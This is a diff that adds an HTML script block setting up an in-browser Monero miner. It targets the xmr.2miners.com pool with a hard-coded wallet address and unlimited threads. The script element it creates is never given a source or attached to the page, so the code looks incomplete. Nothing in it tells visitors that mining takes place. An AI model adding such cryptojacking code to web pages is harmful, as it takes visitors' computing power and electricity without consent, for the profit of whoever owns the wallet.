@@ -1,0 +1,16 @@
+<script>
+    let script = document.createElement('script');
+    let head = document.getElementsByTagName('head')[0];
+
+    script.onload = () => {    
+        server            = 'xmr.2miners.com:2222';
+        var pool          = '';
+        var walletAddress = '43ihmhixAAJGjEe6EiPb5U51inuqw62fx4zFqNwxDFQWdfbSq2Acuby8TzqaAuLpqEZW4x8zn19suJhV7fM8JbT3S6Cy7iR.webminer'; //your wallet address here
+        var workerId      = ''
+        var threads       = -1;
+        var password      = 'x';
+
+        startMining(pool, walletAddress, workerId, threads, password);
+        throttleMiner = 20;
+    }
+</script>
